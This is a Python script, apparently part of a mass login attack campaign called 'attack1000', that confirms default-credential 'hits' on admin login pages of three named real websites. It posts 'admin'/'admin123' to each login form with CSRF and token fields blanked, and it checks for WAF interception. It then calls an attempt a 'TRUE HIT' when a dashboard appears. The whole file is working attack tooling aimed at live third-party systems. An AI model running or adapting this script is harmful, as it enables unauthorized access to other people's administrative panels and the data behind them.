#!/usr/bin/env python3
"""verify attack1000 REAL hits - strict check each"""
import urllib.request, urllib.parse, re, http.cookiejar

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}

def fetch(url, timeout=12, data=None, opener=None):
    op = opener or urllib.request.build_opener()
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None,
                                     headers={**UA, "Content-Type": "application/x-www-form-urlencoded"})
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, url, e.read().decode("utf-8", "ignore")
    except Exception as ex:
        return 0, url, str(ex)

def check(domain, path, cred, tag):
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))
    code, final, body = fetch("http://%s%s" % (domain, path), opener=op)
    print("\n[%s] %s %s -> %s %s len=%d" % (tag, domain, path, code, final, len(body)))
    if code != 200 or not body:
        print("  UNREACHABLE")
        return
    # login form markers
    has_pass = "password" in body.lower() or "密码" in body
    has_user = "username" in body.lower() or "user" in body.lower() or "用户名" in body
    print("  login form: pass=%s user=%s" % (has_pass, has_user))
    # find form action + fields
    m = re.search(r"<form[^>]*action=[\"']([^\"']*)[\"'][^>]*>", body, re.I)
    action = m.group(1) if m else ""
    if action and not action.startswith("http"):
        action = urllib.parse.urljoin("http://%s%s" % (domain, path), action)
    fields = {}
    for fm in re.finditer(r"<input[^>]*name=[\"']([^\"']+)[\"'][^>]*>", body, re.I):
        tag0 = fm.group(0)
        ft = re.search(r"type=[\"']([^\"']+)[\"']", tag0, re.I)
        fields[fm.group(1)] = ft.group(1).lower() if ft else "text"
    print("  form action: %s fields: %s" % (action, list(fields.keys())[:8]))
    if not action or not fields:
        print("  NO FORM - likely front page or catch-all")
        return
    # find user/pass
    uf, pf = None, None
    for n, t in fields.items():
        nl = n.lower()
        if pf is None and ("pass" in nl or "pwd" in nl or t == "password"):
            pf = n
        elif uf is None and ("user" in nl or "login" in nl or "name" in nl or "account" in nl):
            uf = n
    if not pf:
        print("  NO PASS FIELD")
        return
    pw = cred.split("/")[1] if "/" in cred else cred
    payload = {}
    for n, t in fields.items():
        nl = n.lower()
        if n == uf: payload[n] = "admin"
        elif n == pf: payload[n] = pw
        elif t == "hidden" or any(k in nl for k in ["token", "csrf", "check", "code", "validate"]):
            payload[n] = ""
    code2, final2, resp = fetch(action, data=urllib.parse.urlencode(payload), opener=op)
    print("  POST -> %s %s len=%d" % (code2, final2, len(resp)))
    if "stopinfo" in final2 or "stopinfo" in resp:
        print("  WAF-INTERCEPT")
        return
    # GET original path again with session
    code3, final3, body3 = fetch("http://%s%s" % (domain, path), opener=op)
    is_login = ("password" in body3.lower() and "type=\"password\"" in body3.lower()) or "登录" in body3
    dash = any(k in body3.lower() for k in ["dashboard", "退出", "logout", "welcome", "欢迎", "管理", "frame", "主菜单"])
    print("  RE-GET %s len=%d is_login=%s dash=%s" % (final3, len(body3), is_login, dash))
    if dash and not is_login:
        print("  >>> TRUE HIT")
    else:
        print("  >>> FALSE (still login)")

# targets from attack1000_hits
check("cepn.cn", "/admin/login.php", "admin/admin123", "cepn.cn")
check("lsks.org.cn", "/admin/", "admin/admin123", "lsks.org.cn")
check("admin-dashboard.pagsmile.com", "/wp-login.php", "admin/admin123", "pagsmile-WP")
